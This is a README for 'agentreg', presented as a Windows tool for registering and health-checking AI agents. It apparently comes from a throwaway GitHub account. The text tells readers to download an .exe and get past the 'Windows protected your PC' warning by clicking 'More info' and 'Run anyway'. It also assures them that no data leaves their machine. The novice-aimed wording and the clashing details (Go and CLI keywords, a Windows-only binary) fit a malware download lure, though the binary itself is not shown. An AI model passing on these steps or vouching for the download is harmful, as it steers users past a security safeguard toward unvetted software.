# 🌐 agentreg - Easily manage and connect AI agents

[![Download agentreg](https://img.shields.io/badge/Download-blue)](https://github.com/herrmannfigurative689/agentreg/releases)

agentreg acts as a central phonebook for your AI projects. You use it to track where your agents live, check if they work, and find them when your AI needs to run a task. It runs as one small file on your computer.

## 📋 What this tool does

Modern AI systems often rely on multiple small programs known as agents. Keeping track of these agents becomes difficult as your workspace grows. agentreg provides a single point of truth. It tracks the status of each agent and verifies if they remain available for service. 

- Registry: Record the location of every agent you host.
- Discovery: Find existing agents through a simple interface.
- Health Check: Monitor agent availability to ensure AI tasks do not fail.
- Convenience: Maintain your entire setup with a single, standalone file.

## 💻 System requirements

- Windows 10 or Windows 11.
- A stable internet connection.
- 50 MB of free storage space.
- No other software dependencies required.

## 🚀 Downloading the software

You need to download the program file to start.

[Click here to visit the release page and download the latest version.](https://github.com/herrmannfigurative689/agentreg)

Look for the file that ends in .exe. Save this file to a folder where you want your agent tools to stay. A folder named "Tools" in your documents library works well.

## ⚙️ How to run the application

Windows may show a security prompt the first time you run the file because the program is a direct download.

1. Locate the agentreg.exe file you saved.
2. Double-click the file to open it. 
3. If a window labeled "Windows protected your PC" appears, click the "More info" link.
4. Click the "Run anyway" button.
5. A black command window will open. Do not close this window while you use the registry. The window keeps the service active.

## 🔍 Connecting your first agent

Once the window remains open, the service runs in the background. You interact with the registry by opening your web browser.

1. Open your browser.
2. Type http://localhost:8080 into the address bar and press Enter.
3. You will see the agentreg dashboard.
4. Use the "Add" button to input the details of your agent. You must provide a name and the network address where the agent listens for requests.
5. Click Save. The registry now keeps track of your agent.

## 🛠️ Maintaining your registry

The registry keeps a constant eye on your agents. If an agent stops responding, the dashboard will highlight the status in red. You can click the Refresh button at any time to update the health status of all registered connections. 

If you need to remove an agent, select the trash icon beside its name. If you delete the agentreg.exe file later, the registry data will disappear. Keep the executable file in a permanent folder to ensure your configuration remains saved.

## ❓ Frequently asked questions

Do I need to install anything else?
No. The software contains everything it needs to run.

How do I stop the service?
Close the black command window. The service stops immediately.

Does this send data to the cloud?
No. The software is self-hosted. All data stays strictly on your computer at all times.

Can I move the program file?
Yes. You can move the file to any folder. However, keep the program and its data files in the same location so the service finds your settings.

Keywords: agent-registry, ai-agents, cli, devtools, golang, health-check, mcp, model-context-protocol, self-hosted, service-discovery